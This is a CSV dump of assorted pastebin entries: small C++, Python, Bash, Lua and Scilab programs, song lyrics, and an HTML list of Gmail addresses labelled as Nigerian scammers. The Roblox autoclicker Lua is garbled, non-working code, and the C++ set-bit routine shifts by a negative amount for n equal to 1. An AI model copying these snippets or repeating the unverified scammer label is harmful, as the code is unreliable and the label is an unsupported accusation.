id,title,username,language,date,content
Vm0crTYD,Count total set bits,jayati,C++,Tuesday 3rd of October 2023 12:51:55 AM CDT,"//{ Driver Code Starts
//Initial Template for C++

#include<bits/stdc++.h>
using namespace std;


// } Driver Code Ends
//User function Template for C++

class Solution{
    public:
    // n: input to count the number of set bits
    //Function to return sum of count of set bits in the integers from 1 to n.
    int findlargest(int num)
    {
        int x=0;
        while(1<<x <= num)
        {
            x++;
        }
        return x-1;
    }
    int countSetBits(int n)
    {
        if(n==0)
        {
            return 0;
        }
        int x=findlargest(n);
        int counttillx=(1<<(x-1))*x;
        int countafterx=(n-(1<<x))+1;
        int rest= (n-(1<<x));
        int ans=counttillx+countafterx+countSetBits(rest);
        return ans;
    }
};


//{ Driver Code Starts.

// Driver code
int main()
{
	 int t;
	 cin>>t;// input testcases
	 while(t--) //while testcases exist
	 {
	       int n;
	       cin>>n; //input n
	       Solution ob;
	       cout << ob.countSetBits(n) << endl;// print the answer
	  }
	  return 0;
}

// } Driver Code Ends"
NdF3M0Bk,detect and save Fonts and Paragraphs from docx to html,nicuf,Python,Tuesday 3rd of October 2023 12:38:29 AM CDT,"import docx

def run_get_style(run) -> str:
    if run.bold:
        return ""bold""
    elif run.italic:
        return ""italic""
    else:
        return ""normal""

def convert_docx_to_html_with_styles(document: docx.Document, output_file: str) -> None:
    with open(output_file, ""w"") as f:
        f.write(""<html>\n<body>\n"")
        current_style = None

        for paragraph in document.paragraphs:
            runs = paragraph.runs
            if not runs:
                continue

            for run in runs:
                run_style = run_get_style(run)

                if run_style == current_style:
                    f.write(run.text)
                else:
                    if current_style:
                        if current_style == ""bold"":
                            f.write(""</b>"")
                        elif current_style == ""italic"":
                            f.write(""</em>"")
                    if run_style == ""bold"":
                        f.write(""<b>"")
                    elif run_style == ""italic"":
                        f.write(""<em>"")

                    f.write(run.text)
                    current_style = run_style

            f.write(""<br>\n"")  # Adăugăm un salt de linie între paragrafe

        if current_style:
            if current_style == ""bold"":
                f.write(""</b>"")
            elif current_style == ""italic"":
                f.write(""</em>"")

        f.write(""</body>\n</html>"")

def main():
    document = docx.Document(""bebe.docx"")
    convert_docx_to_html_with_styles(document, ""bebe.html"")

if __name__ == ""__main__"":
    main()
"
PjT7G1Wr,song snowy,coinwalk,JavaScript,Tuesday 3rd of October 2023 12:34:13 AM CDT,"next time i feel I've a little ditty going through my head...
I'll find a means of attack to my very worse nightmares
seems like... they fall on deaf doors... and feed the souls... it will keep....
because life's got no turns but creepy
creepy vibes hits the doors of closed ears,
whack a mole on a stereo
its nice to dream...
been golden for my relatives .... they say nothing about what i can or did.... 
sometimes... i pray they don't fade away...
some time i pray they'd ring me just to see if I'm OK..
every time i see them they think i want something from them ..
its not always the case...
I'm probably their disgrace...
I'm torn outta place..
because life's no turns but creepy.
creepy vibes hits the doors of closed ears
whack a mole on a stereo
its nice to dream..."
8NsXZakj,TimeMemoryGenerator.sh,swear01,Bash,Tuesday 3rd of October 2023 12:11:51 AM CDT,"#!/usr/bin/bash

#############################################################################
# File       [ TimeMemoryGenerator.sh ]
# Author     [ Swear01 ]
# Synopsis   [ simple test for algorithm PA1 homework format program ]
# Date       [ 2020/10/01 ]
#############################################################################

# please ensure your code is right before use this
# please use this under PA1 folder


#SIZES = (1000 2000 4000 8000 16000 32000 1000000)
declare -a SIZES=(1000 2000 4000 8000 16000 32000 1000000)
declare -a CASE_ORDERS=(2 3 1)
declare -a METHODS=(IS MS QS RQS HS)


#init
make

echo -n ""data,"" > ram.csv
echo -n ""data,"" > cpu_time.csv

for method in ""${METHODS[@]}"" ; do
    echo -n ""$method,"" >> ram.csv
    echo -n ""$method,"" >> cpu_time.csv
done

echo "" "" >> ram.csv
echo "" "" >> cpu_time.csv

for size in ""${SIZES[@]}"" ; do
    for case_order in ""${CASE_ORDERS[@]}"" ; do
        echo -n ""$size"".case""$case_order,"" >> cpu_time.csv
        echo -n ""$size"".case""$case_order,"" >> ram.csv
        for method in ""${METHODS[@]}"" ; do
            echo current running -""$method"" inputs/""$size"".case""$case_order"".in
            bin/NTU_sort -""$method"" inputs/""$size"".case""$case_order"".in outputs/""$size"".case""$case_order"".out > tmp.txt
            #utility/PA1_Result_Checker inputs/""$size"".case""$case_order"".in outputs/""$size"".case""$case_order"".out 
            
            nums=($(grep -Eo '[0-9\.]+' tmp.txt))

            echo -n ""${nums[0]},"" >> cpu_time.csv
            echo -n ""${nums[1]},"" >> ram.csv
        done
        echo "" "" >> ram.csv
        echo "" "" >> cpu_time.csv
    done
done"
DiuFREBW,Untitled,Coolaidman,Python,Tuesday 3rd of October 2023 12:02:45 AM CDT,"{""embed"": {""title"": ""hey there how are you"", ""description"": ""this is a description""}}"
c7B2Bfqr,CC,Snorlax_6987,Lua,Monday 2nd of October 2023 11:26:45 PM CDT,"local currentSlot = 1

function findItems()
    local items = {}

    for itemSlot = 1, 16 do
        if turtle.getItemSpace(itemSlot) ~= 64 then
            table.insert(items, itemSlot)
        end
    end

    return items
end

function itemCheck()
    local itemTable = findItems()
    if #itemTable == 0 then
        return false
    end
    for _,itemSlot in pairs(itemTable) do
        currentSlot = itemSlot
        turtle.select(currentSlot)
        os.sleep(0.05)
        turtle.dropDown()
    end
end

local lastCheck = os.clock()

while true do
    local now = os.clock()
    turtle.attack()
    if now - lastCheck > 1 then
        lastCheck = now
        itemCheck()
    end
    os.sleep(0.25)
end"
HwzkuHYC,TP5_PUNTO3,FacundoCruz,Scilab,Monday 2nd of October 2023 10:39:18 PM CDT,"// --------------      Leer los datos del archivo de texto plano  -----------------

// obtener los datos de la curva 1

[pSupx,pSupy] = readarchivo('C:\Users\PC\Desktop\Calculo Numerico\TP5\curva 1.txt');
  
// obtener los datos de la curva 2

 [pInfx,pInfy] = readarchivo('C:\Users\PC\Desktop\Calculo Numerico\TP5\curva 2.txt');
  
// obtener los datos de la curva 3

 [pAlaSupx,pAlaSupy] = readarchivo('C:\Users\PC\Desktop\Calculo Numerico\TP5\curva 3.txt');
  

//Generar los trazadores cubicos
d1 = splin(pSupx,pSupy);
xx1 = linspace(pSupx(1),pSupx(length(pSupx)));
yy1 = interp(xx1,pSupx,pSupy,d1); //perfil superior

d2 = splin(pInfx,pInfy);
xx2 = linspace(pInfx(1),pInfx(length(pInfx)));
yy2 = interp(xx2,pInfx,pInfy,d2); //perfill inferior


d3 = splin(pAlaSupx,pAlaSupy);
xx3 = linspace(pAlaSupx(1),pAlaSupx(length(pAlaSupx)));
yy3 = interp(xx3,pAlaSupx,pAlaSupy,d3); //perfil ala superior


//Graficar perfil aproximado del snoopy
plot(xx1,yy1,'r')
plot(pSupx,pSupy,'bo')

plot(xx2,yy2)
plot(pInfx,pInfy,'ro')

plot(xx3,yy3,'k')
plot(pAlaSupx,pAlaSupy,'go')

xgrid(12)

title('Snoopy')"
xz28DA4D,Nigerian scammers [2-10-1/2023],bombaires,HTML,Monday 2nd of October 2023 10:32:52 PM CDT,"<a href=""mailto:financialconsultantroger@gmail.com"">financialconsultantroger@gmail.com</a>
<a href=""mailto:financialconsultantroger+26304@gmail.com"">financialconsultantroger+26304@gmail.com</a>
<a href=""mailto:financialconsultantroger+5504@gmail.com"">financialconsultantroger+5504@gmail.com</a>
<a href=""mailto:financialconsultantroger+26077@gmail.com"">financialconsultantroger+26077@gmail.com</a>
<a href=""mailto:financialconsultantroger+4997@gmail.com"">financialconsultantroger+4997@gmail.com</a>
<a href=""mailto:financialconsultantroger+31923@gmail.com"">financialconsultantroger+31923@gmail.com</a>
<a href=""mailto:financialconsultantroger+3874@gmail.com"">financialconsultantroger+3874@gmail.com</a>
<a href=""mailto:financialconsultantroger+12740@gmail.com"">financialconsultantroger+12740@gmail.com</a>
<a href=""mailto:financialconsultantroger+20662@gmail.com"">financialconsultantroger+20662@gmail.com</a>
<a href=""mailto:financialconsultantroger+26735@gmail.com"">financialconsultantroger+26735@gmail.com</a>
<a href=""mailto:financialconsultantroger+27397@gmail.com"">financialconsultantroger+27397@gmail.com</a>
<a href=""mailto:financialconsultantroger+22751@gmail.com"">financialconsultantroger+22751@gmail.com</a>
<a href=""mailto:financialconsultantroger+25817@gmail.com"">financialconsultantroger+25817@gmail.com</a>
<a href=""mailto:financialconsultantroger+6805@gmail.com"">financialconsultantroger+6805@gmail.com</a>
<a href=""mailto:financialconsultantroger+1239@gmail.com"">financialconsultantroger+1239@gmail.com</a>
<a href=""mailto:financialconsultantroger+16694@gmail.com"">financialconsultantroger+16694@gmail.com</a>
<a href=""mailto:financialconsultantroger+5987@gmail.com"">financialconsultantroger+5987@gmail.com</a>
<a href=""mailto:financialconsultantroger+13393@gmail.com"">financialconsultantroger+13393@gmail.com</a>
<a href=""mailto:financialconsultantroger+7359@gmail.com"">financialconsultantroger+7359@gmail.com</a>
<a href=""mailto:financialconsultantroger+15322@gmail.com"">financialconsultantroger+15322@gmail.com</a>
<a href=""mailto:financialconsultantroger+23164@gmail.com"">financialconsultantroger+23164@gmail.com</a>
<a href=""mailto:financialconsultantroger+30025@gmail.com"">financialconsultantroger+30025@gmail.com</a>
<a href=""mailto:financialconsultantroger+26325@gmail.com"">financialconsultantroger+26325@gmail.com</a>
<a href=""mailto:financialconsultantroger+23303@gmail.com"">financialconsultantroger+23303@gmail.com</a>
<a href=""mailto:financialconsultantroger+10613@gmail.com"">financialconsultantroger+10613@gmail.com</a>
<a href=""mailto:financialconsultantroger+13953@gmail.com"">financialconsultantroger+13953@gmail.com</a>
<a href=""mailto:financialconsultantroger+3183@gmail.com"">financialconsultantroger+3183@gmail.com</a>
<a href=""mailto:financialconsultantroger+20720@gmail.com"">financialconsultantroger+20720@gmail.com</a>
<a href=""mailto:financialconsultantroger+11304@gmail.com"">financialconsultantroger+11304@gmail.com</a>
<a href=""mailto:financialconsultantroger+9834@gmail.com"">financialconsultantroger+9834@gmail.com</a>
<a href=""mailto:financialconsultantroger+7051@gmail.com"">financialconsultantroger+7051@gmail.com</a>
<a href=""mailto:financialconsultantroger+19325@gmail.com"">financialconsultantroger+19325@gmail.com</a>
<a href=""mailto:financialconsultantroger+4361@gmail.com"">financialconsultantroger+4361@gmail.com</a>
<a href=""mailto:financialconsultantroger+3172@gmail.com"">financialconsultantroger+3172@gmail.com</a>
<a href=""mailto:financialconsultantroger+3213@gmail.com"">financialconsultantroger+3213@gmail.com</a>
<a href=""mailto:financialconsultantroger+12383@gmail.com"">financialconsultantroger+12383@gmail.com</a>
<a href=""mailto:financialconsultantroger+13014@gmail.com"">financialconsultantroger+13014@gmail.com</a>
<a href=""mailto:financialconsultantroger+27980@gmail.com"">financialconsultantroger+27980@gmail.com</a>
<a href=""mailto:financialconsultantroger+29542@gmail.com"">financialconsultantroger+29542@gmail.com</a>
<a href=""mailto:financialconsultantroger+23418@gmail.com"">financialconsultantroger+23418@gmail.com</a>
<a href=""mailto:financialconsultantroger+16510@gmail.com"">financialconsultantroger+16510@gmail.com</a>
<a href=""mailto:financialconsultantroger+15704@gmail.com"">financialconsultantroger+15704@gmail.com</a>
<a href=""mailto:financialconsultantroger+26561@gmail.com"">financialconsultantroger+26561@gmail.com</a>
<a href=""mailto:financialconsultantroger+15055@gmail.com"">financialconsultantroger+15055@gmail.com</a>
<a href=""mailto:financialconsultantroger+2645@gmail.com"">financialconsultantroger+2645@gmail.com</a>
<a href=""mailto:financialconsultantroger+13855@gmail.com"">financialconsultantroger+13855@gmail.com</a>
<a href=""mailto:financialconsultantroger+23778@gmail.com"">financialconsultantroger+23778@gmail.com</a>
<a href=""mailto:financialconsultantroger+1943@gmail.com"">financialconsultantroger+1943@gmail.com</a>
<a href=""mailto:financialconsultantroger+1294@gmail.com"">financialconsultantroger+1294@gmail.com</a>
<a href=""mailto:financialconsultantroger+15219@gmail.com"">financialconsultantroger+15219@gmail.com</a>
<a href=""mailto:financialconsultantroger+14225@gmail.com"">financialconsultantroger+14225@gmail.com</a>
<a href=""mailto:financialconsultantroger+3509@gmail.com"">financialconsultantroger+3509@gmail.com</a>
<a href=""mailto:financialconsultantroger+5696@gmail.com"">financialconsultantroger+5696@gmail.com</a>
<a href=""mailto:financialconsultantroger+5505@gmail.com"">financialconsultantroger+5505@gmail.com</a>
<a href=""mailto:financialconsultantroger+11834@gmail.com"">financialconsultantroger+11834@gmail.com</a>
<a href=""mailto:financialconsultantroger+30318@gmail.com"">financialconsultantroger+30318@gmail.com</a>
<a href=""mailto:financialconsultantroger+32489@gmail.com"">financialconsultantroger+32489@gmail.com</a>
<a href=""mailto:financialconsultantroger+27834@gmail.com"">financialconsultantroger+27834@gmail.com</a>
<a href=""mailto:financialconsultantroger+21983@gmail.com"">financialconsultantroger+21983@gmail.com</a>
<a href=""mailto:financialconsultantroger+30665@gmail.com"">financialconsultantroger+30665@gmail.com</a>
<a href=""mailto:financialconsultantroger+31641@gmail.com"">financialconsultantroger+31641@gmail.com</a>
<a href=""mailto:financialconsultantroger+7468@gmail.com"">financialconsultantroger+7468@gmail.com</a>
<a href=""mailto:financialconsultantroger+13268@gmail.com"">financialconsultantroger+13268@gmail.com</a>
<a href=""mailto:financialconsultantroger+24402@gmail.com"">financialconsultantroger+24402@gmail.com</a>
<a href=""mailto:financialconsultantroger+28461@gmail.com"">financialconsultantroger+28461@gmail.com</a>
<a href=""mailto:financialconsultantroger+31998@gmail.com"">financialconsultantroger+31998@gmail.com</a>
<a href=""mailto:financialconsultantroger+31875@gmail.com"">financialconsultantroger+31875@gmail.com</a>
<a href=""mailto:financialconsultantroger+17113@gmail.com"">financialconsultantroger+17113@gmail.com</a>
<a href=""mailto:financialconsultantroger+29612@gmail.com"">financialconsultantroger+29612@gmail.com</a>
<a href=""mailto:financialconsultantroger+19383@gmail.com"">financialconsultantroger+19383@gmail.com</a>
<a href=""mailto:financialconsultantroger+2019@gmail.com"">financialconsultantroger+2019@gmail.com</a>
<a href=""mailto:financialconsultantroger+20149@gmail.com"">financialconsultantroger+20149@gmail.com</a>
<a href=""mailto:financialconsultantroger+15455@gmail.com"">financialconsultantroger+15455@gmail.com</a>
<a href=""mailto:financialconsultantroger+14997@gmail.com"">financialconsultantroger+14997@gmail.com</a>
<a href=""mailto:financialconsultantroger+24965@gmail.com"">financialconsultantroger+24965@gmail.com</a>
<a href=""mailto:financialconsultantroger+12513@gmail.com"">financialconsultantroger+12513@gmail.com</a>
<a href=""mailto:financialconsultantroger+19471@gmail.com"">financialconsultantroger+19471@gmail.com</a>
<a href=""mailto:financialconsultantroger+1965@gmail.com"">financialconsultantroger+1965@gmail.com</a>
<a href=""mailto:financialconsultantroger+11230@gmail.com"">financialconsultantroger+11230@gmail.com</a>
<a href=""mailto:financialconsultantroger+14552@gmail.com"">financialconsultantroger+14552@gmail.com</a>
<a href=""mailto:financialconsultantroger+3831@gmail.com"">financialconsultantroger+3831@gmail.com</a>
<a href=""mailto:financialconsultantroger+9327@gmail.com"">financialconsultantroger+9327@gmail.com</a>
<a href=""mailto:financialconsultantroger+28530@gmail.com"">financialconsultantroger+28530@gmail.com</a>
<a href=""mailto:financialconsultantroger+6857@gmail.com"">financialconsultantroger+6857@gmail.com</a>
<a href=""mailto:financialconsultantroger+435@gmail.com"">financialconsultantroger+435@gmail.com</a>
<a href=""mailto:financialconsultantroger+4483@gmail.com"">financialconsultantroger+4483@gmail.com</a>
<a href=""mailto:financialconsultantroger+10934@gmail.com"">financialconsultantroger+10934@gmail.com</a>
<a href=""mailto:financialconsultantroger+23812@gmail.com"">financialconsultantroger+23812@gmail.com</a>
<a href=""mailto:financialconsultantroger+506@gmail.com"">financialconsultantroger+506@gmail.com</a>
<a href=""mailto:financialconsultantroger+12962@gmail.com"">financialconsultantroger+12962@gmail.com</a>
<a href=""mailto:financialconsultantroger+20788@gmail.com"">financialconsultantroger+20788@gmail.com</a>
<a href=""mailto:financialconsultantroger+30612@gmail.com"">financialconsultantroger+30612@gmail.com</a>
<a href=""mailto:financialconsultantroger+18919@gmail.com"">financialconsultantroger+18919@gmail.com</a>
<a href=""mailto:financialconsultantroger+28225@gmail.com"">financialconsultantroger+28225@gmail.com</a>
<a href=""mailto:financialconsultantroger+8931@gmail.com"">financialconsultantroger+8931@gmail.com</a>
<a href=""mailto:financialconsultantroger+4936@gmail.com"">financialconsultantroger+4936@gmail.com</a>
<a href=""mailto:financialconsultantroger+14379@gmail.com"">financialconsultantroger+14379@gmail.com</a>
<a href=""mailto:financialconsultantroger+7351@gmail.com"">financialconsultantroger+7351@gmail.com</a>
<a href=""mailto:financialconsultantroger+11500@gmail.com"">financialconsultantroger+11500@gmail.com</a>
<a href=""mailto:financialconsultantroger+28142@gmail.com"">financialconsultantroger+28142@gmail.com</a>
<a href=""mailto:financialconsultantroger+4784@gmail.com"">financialconsultantroger+4784@gmail.com</a>"
RkWwCBFb,diff.py,dyeske,Python,Monday 2nd of October 2023 10:25:37 PM CDT,"#!/usr/bin/env python
"""""" This takes unified diff output and adds colors """"""

from __future__ import print_function
import re
import sys

def main():
    """""" main routine """"""
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[0;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    ENDCOLOR = '\033[0m'
    added = 0
    deleted = 0

    try:
        for line in sys.stdin:
            if re.search('(^Index: .*)', line):
                line = ""%s%s%s"" % (BLUE, line, ENDCOLOR)
            elif re.search('(^\+\+\+ .*)', line):
                line = ""%s%s%s"" % (MAGENTA, line, ENDCOLOR)
            elif re.search('(^\+.*)', line):
                line = ""%s%s%s"" % (GREEN, line, ENDCOLOR)
                added = added + 1
            elif re.search('(^\-\-\- .*)', line):
                line = ""%s%s%s"" % (YELLOW, line, ENDCOLOR)
            elif re.search('(^\-.*)', line):
                line = ""%s%s%s"" % (RED, line, ENDCOLOR)
                deleted = deleted + 1
            else:
                pass
            sys.stdout.write(line)
        print('added ' + str(added) + ' deleted ' + str(deleted))
    except:
        print('exception')

if __name__ == '__main__':
    main()
"
GHUmxY4D,virtual autoclicker roblox |,404Coder,Lua,Monday 2nd of October 2023 10:06:50 PM CDT,"local VirtualUserInput = game.Player(""VirtualUserInput"")
local VirtualUserInput = game:GetInputService()
function InputService(inputservice)
    if InputService == Player.VirtualUserInput then
        VirtualUserInput.Player.mouse = game:GetVirtualUserMouse())
    if VirtualUserMouse then
        virtualUser.Mouse = mouse.player()
        end
    end
_G VirtualUserInput = true
game.VirtualUserInput = game.VirtualUserInput:GetMouse()
if VirtualUserInput == mouse2 and Player.Mouse == mouse1:Getmouse2 not mouse1
    if mouse2 == VirtualUserInput then
        _G autoclicker = true
        _G autoclicker.mouse2 = (""VirtualUserInput, mouse2"")
        end
    end
    end)
"
